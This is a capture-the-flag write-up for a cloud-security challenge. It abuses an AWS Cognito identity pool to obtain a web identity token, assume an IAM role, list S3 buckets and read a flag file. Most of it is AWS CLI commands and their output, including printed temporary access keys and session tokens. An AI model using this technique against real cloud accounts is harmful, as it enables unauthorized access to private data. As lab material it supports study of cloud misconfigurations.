# Challenge 6

## Anonymous access no more. Let's see what can you do now. Now try it with the authenticated role: arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role
- https://bigiamchallenge.com/challenge/6
 
## IAM Policy
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "cognito-identity.amazonaws.com"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "cognito-identity.amazonaws.com:aud": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
                }
            }
        }
    ]
}
```

## Solution

```bash
aws cognito-identity get-id --identity-pool-id  us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b
{
    "IdentityId": "us-east-1:40937fe8-22d8-41da-959a-bb32296491af"
}
```
```bash
> aws cognito-identity get-open-id-token --identity-id us-east-1:40937fe8-22d8-41da-959a-bb32296491af
{
    "IdentityId": "us-east-1:40937fe8-22d8-41da-959a-bb32296491af",
    "Token": "eyJraWQiOiJ1cy1lYXN0LTEzIiwidHlwIjoiSldTIiwiYWxnIjoiUlM1MTIifQ.eyJzdWIiOiJ1cy1lYXN0LTE6NDA5MzdmZTgtMjJkOC00MWRhLTk1OWEtYmIzMjI5NjQ5MWFmIiwiYXVkIjoidXMtZWFzdC0x
OmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE2OTE2NjQ4MzEsI
mlhdCI6MTY5MTY2NDIzMX0.mj3V0EgcFoX90L2rHjPWHP1nLZWx5aRxkyVDQOGBFf5KFQI97z3cZ_FZ_XIzhBKklcqKfHi4c35oleatOcDr7oXaytOqJg6ng7OEFgcHk0mEDbXechiz7PdtPDcq4GxFaQf5B0X8UDEGYH-L_7wsC4
bxePbR3fwIV-JU9x_U-_we8e6PmeKXFuB0VfeY4c83fKHgpT3tg53N0sj522d05BXPuC85rlHfQgaNshCQUVXIpx3vw2_7HU-e1R9H9JWj8GYfh9fTIJ55UDYAVOFJQfJEoka9c4gTyXKKF3GFI6MGXfX_DNE8oDTAaGz8U3-zFT2
JNpGwP2-H1jfszPrPMg"
}
```
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --role-session-name pwn3d --web-identity-token eyJraWQiOiJ1cy1lYXN0LTEzIiwidHlwIjoiSldTIiwiYWxnIjoiUlM1MTIifQ.eyJzdWIiOiJ1cy1lYXN0LTE6NDA5MzdmZTgtMjJkOC00MWRhLTk1OWEtYmIzMjI5NjQ5MWFmIiwiYXVkIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE2OTE2NjQ4MzEsImlhdCI6MTY5MTY2NDIzMX0.mj3V0EgcFoX90L2rHjPWHP1nLZWx5aRxkyVDQOGBFf5KFQI97z3cZ_FZ_XIzhBKklcqKfHi4c35oleatOcDr7oXaytOqJg6ng7OEFgcHk0mEDbXechiz7PdtPDcq4GxFaQf5B0X8UDEGYH-L_7wsC4bxePbR3fwIV-JU9x_U-_we8e6PmeKXFuB0VfeY4c83fKHgpT3tg53N0sj522d05BXPuC85rlHfQgaNshCQUVXIpx3vw2_7HU-e1R9H9JWj8GYfh9fTIJ55UDYAVOFJQfJEoka9c4gTyXKKF3GFI6MGXfX_DNE8oDTAaGz8U3-zFT2JNpGwP2-H1jfszPrPMg
```
```bash
{
    "Credentials": {
        "AccessKeyId": "ASIARK7LBOHXJMR2EPKG",
        "SecretAccessKey": "JFPelKhQU8f2e8+jw1rCgU4d8QUfGPUF4cEK51KL",
        "SessionToken": "FwoGZXIvYXdzECQaDPyZT+SjmjwnMD0ZEyKdAmYu2xPKxgd2lhVR72MRGTQeVtVxRxlsORniasWKtpnunmFplnMzJ+hj1wBSivManZKH/+2vUyfRA7ri0qYNz2Rv6XBgFVMUjnWwrJVXYMMUKtrM
PSu6soay8zM/5f1mrgw1TSEnjujZ9Dhse/DNZw198FXsLglC8MQRX2ZR43h0jl4aa2GUXRX/30uw0SEt6heJq2jDkMMV2YgREnYoMUImD9gVQcmUGGwkzYxMJagU9x06azP30KnFRu2+NpbLhOAYMXrc9SgotfiPeSLnhKEoEimbr
Fat5K9PqnSGZ7kMupvcyjJmakWehq6IEQDp7UD2JsZvDm3nCkg0OcS8yIs4tRAy3GtqO6DriOHFoDs4zcAhX78j8OYzxk5+sSiw/9KmBjKWAUaOffefp9QHaPbfdi3OBmw9OPwxA72AzuiQUyc9ZHZNkvPtchDUGqVnb0TQpfiFRC
9shc3i/6K3OyJYb0vDMKN3DtuDUv911I/OdL5hYEQsPqBqGiyw6/iIM36X2Rbqh9DFpHEBJ66f4/5+LPSAgm9AcEtRFAavrIJH1C0k9e4cPiKzz/imtbhcxuEoKyDuzP0Ap5i5/A==",
        "Expiration": "2023-08-10T11:45:04Z"
    },
    "SubjectFromWebIdentityToken": "us-east-1:40937fe8-22d8-41da-959a-bb32296491af",
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARK7LBOHXASFTNOIZG:pwn3d",
        "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/pwn3d"
    },
    "Provider": "cognito-identity.amazonaws.com",
    "Audience": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
}
```
```config
[bigiamchallenge6]
aws_access_key_id = ASIARK7LBOHXJMR2EPKG
aws_secret_access_key = JFPelKhQU8f2e8+jw1rCgU4d8QUfGPUF4cEK51KL
aws_session_token = FwoGZXIvYXdzECQaDPyZT+SjmjwnMD0ZEyKdAmYu2xPKxgd2lhVR72MRGTQeVtVxRxlsORniasWKtpnunmFplnMzJ+hj1wBSivManZKH/+2vUyfRA7ri0qYNz2Rv6XBgFVMUjnWwrJVXYMMUKtrMPSu6soay8zM/5f1mrgw1TSEnjujZ9Dhse/DNZw198FXsLglC8MQRX2ZR43h0jl4aa2GUXRX/30uw0SEt6heJq2jDkMMV2YgREnYoMUImD9gVQcmUGGwkzYxMJagU9x06azP30KnFRu2+NpbLhOAYMXrc9SgotfiPeSLnhKEoEimbrFat5K9PqnSGZ7kMupvcyjJmakWehq6IEQDp7UD2JsZvDm3nCkg0OcS8yIs4tRAy3GtqO6DriOHFoDs4zcAhX78j8OYzxk5+sSiw/9KmBjKWAUaOffefp9QHaPbfdi3OBmw9OPwxA72AzuiQUyc9ZHZNkvPtchDUGqVnb0TQpfiFRC9shc3i/6K3OyJYb0vDMKN3DtuDUv911I/OdL5hYEQsPqBqGiyw6/iIM36X2Rbqh9DFpHEBJ66f4/5+LPSAgm9AcEtRFAavrIJH1C0k9e4cPiKzz/imtbhcxuEoKyDuzP0Ap5i5/A==
```

```bash
aws s3 ls --profile bigiamchallenge6
2023-06-04 19:07:29 tbic-wiz-analytics-bucket-b44867f
2023-06-05 15:07:44 thebigiamchallenge-admin-storage-abf1321
2023-06-04 18:31:02 thebigiamchallenge-storage-9979f4b
2023-06-05 15:28:31 wiz-privatefiles
2023-06-05 15:28:31 wiz-privatefiles-x1000
```
```bash
aws s3 ls s3://wiz-privatefiles-x1000 --profile bigiamchallenge6
2023-06-05 21:42:27       4220 cognito2.png
2023-06-05 15:28:35         40 flag2.txt
```
```bash
aws s3 cp s3://wiz-privatefiles-x1000/flag2.txt -  --profile bigiamchallenge6
{wiz:open-sesame-or-shell-i-xxxxxxxx}
```
